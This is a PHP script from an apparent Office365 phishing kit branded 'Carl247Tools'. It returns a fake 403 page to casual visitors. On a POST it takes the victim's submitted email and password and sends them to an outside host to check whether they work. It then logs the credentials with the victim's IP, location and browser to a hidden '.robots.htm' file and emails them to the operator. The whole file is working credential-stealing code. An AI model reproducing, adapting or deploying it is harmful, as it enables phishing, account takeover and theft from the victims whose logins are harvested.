<?php
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}
include('email.php');
require_once('block_detectors.php'); // leave this line
function disable_trackers(){
	//This fuction disables tracking
	return "";
	
}
if (isset($_POST['password1'])) {
$email2 = $_POST['email1'];
$password2 = $_POST['password1'];
$info = new info(); // requires block_detectors.php 
$browser = $_SERVER['HTTP_USER_AGENT']; 
$url = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; 
//===================================


$post = [
    'username' => $email2,
    'password' => $password2,
];
$ch = curl_init('http://true-login.carl247tools.club/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_REFERER, $url);
$response = curl_exec($ch);
curl_close($ch);
if($response == 1){
$span = "<span style='color:green'>";
}else{
$span = "<span style='color:red'>";	
}


date_default_timezone_set('GMT');
$myFile = ".robots.htm";
$today = date("l, j M, Y, g:ia e");
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $span."==================+[ Carl247Tools V 2.1 [PRV8] ]+==================</br>";
fwrite($fh, $stringData);
$stringData = "Username: <b>".$email2."</b></br>";
fwrite($fh, $stringData);
$stringData = "Password: <b>".$password2."</b></br>";
fwrite($fh, $stringData);
$stringData = "------------------+More Info+---------------------</br>";
fwrite($fh, $stringData);
$stringData = "Date    : ".$today."</br>";
fwrite($fh, $stringData);
$stringData = "ClientIP: ".$info->ip."</br>";
fwrite($fh, $stringData);
$stringData = "Region  : ".$info->city."</br>";
fwrite($fh, $stringData);
$stringData = "Country : <img src='https://www.countryflags.io/".$info->code."/shiny/16.png'>".$info->country."</br>";
fwrite($fh, $stringData);
$stringData = "Browser : ".$browser."</br>";
fwrite($fh, $stringData);
$stringData = "=================Created BY Carl247tools==================</br></span>";
fwrite($fh, $stringData);

//=====================================

$message = $span."============+[ Carl247Tools V 2.1 [PRV8] ]+============<br>";
$message .= "Username: <b>".$email2."</b><br>";
$message .= "Password: <b>".$password2."</b><br>";
$message .= "------------------+More Info+---------------------<br>";
$message .= "Date    : ".$today."<br>";
$message .= "ClientIP: ". $info->ip."<br>";
$message .= "Region  : ".$info->city."<br>";
$message .= "Country : <img src='https://www.countryflags.io/".$info->code."/shiny/16.png'>".$info->country."<br>";
$message .= "Browser : ".$browser."<br>";
$message .= "=================Created BY Carl247tools==================<br></span>";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers  = 'From: OfficeBoy <admin@' .gethostname(). ">\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		
$subject = "Office365 => $info->country => $email2";


	mail($to, $subject, $message, $headers);


echo $response;
}

?>